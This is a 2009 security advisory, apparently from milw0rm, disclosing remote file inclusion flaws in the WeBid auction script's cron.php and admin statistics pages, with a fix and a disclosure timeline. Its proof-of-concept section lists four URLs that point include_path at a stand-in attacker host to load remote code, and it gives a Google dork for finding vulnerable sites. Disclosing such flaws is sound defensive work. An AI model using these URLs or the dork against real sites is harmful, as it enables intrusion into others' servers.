@@ -1,0 +1,86 @@
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_104$2009] WeBid <= 0.7.3 RC9 Multiple Remote File Inclution Vulnerabilities
+-----------------------------------------------------------------------------------------
+
+Author       : K-159
+Date         : March, 11 th 2009
+Location     : Jakarta, Indonesia
+Web          : http://e-rdc.org/v1/news.php?readmore=127
+Critical Lvl : High
+Impact       : System Access
+Where        : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application : WeBid
+version     : <= 0.7.3 RC9
+Vendor      : http://sourceforge.net/projects/simpleauction
+              http://www.webidsupport.com/
+Description :
+
+WeBid is Open source php/mysql fully featured auction script. Perfect for those who want to start their own auction site.
+
+--------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~
+
+Input passed to the "$include_path" parameter in cron.php page is not properly verified before being used 
+to include files.This can be exploited to include arbitrary files from local or external resources.
+This vulnerability also happen to files ST_browsers.php, ST_countries.php, ST_platforms.php in admin's folder
+Successful exploitation requires that "register_globals" is enabled.
+
+
+Poc/Exploit:
+~~~~~~~
+http://www.example.com/[path]/cron.php?include_path=http://www.attacker.com/evil?
+http://www.example.com/[path]/admin/ST_brwosers.php?include_path=http://www.attacker.com/evil?
+http://www.example.com/[path]/admin/ST_countries.php?include_path=http://www.attacker.com/evil?
+http://www.example.com/[path]/admin/ST_platforms.php?include_path=http://www.attacker.com/evil?
+
+Dork:
+~~~
+Google : "copyright 2008, WEBID"
+
+
+Solution:
+~~~~~
+
+- Edit the source code to ensure that input is properly verified.
+- turn off register_globals.
+
+Timeline:
+~~~~~~~
+
+- 08 - 03 - 2009 bug found
+- 08 - 03 - 2009 vendor contacted
+- 08 - 03 - 2009 vendor response
+- 11 - 03 - 2009 advisory release
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~
+~ ping - my dearest wife, zizou - my beloved son, i-eyes - my beloved daughter.
+~ y3dips,the_day,Negatif,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v,az001,
+the_hydra,neng chika, str0ke
+~ scanners [at] SCAN-NUSANTARA and SCAN-ASSOCIATES
+~ SK,Abond,pokley,cybertank, super_temon,whatsoever,b120t0,inggar,fachri,adi,rahmat,indra
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,cyb3rh3b,cR4SH3R,ogeb,bagan,devsheed
+~ dr188le,cow_1seng,poniman_coy,paman_gembul,ketut,rizal,ghostblup,shamus,
+kuntua, stev_manado,nofry,k1tk4t,0pt1c,k1ngk0ng
+~ newbie_hacker@yahoogroups.com
+~ milw0rm.com, macaholic.info, unitiga.com, mac.web.id, indowebster.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~
+
+K-159 || echo|staff || adv[at]e-rdc[dot]org
+Homepage: http://www.e-rdc.org/
+
+-------------------------------- [ EOF ] ---------------------------------- 
+
+# milw0rm.com [2009-03-10]
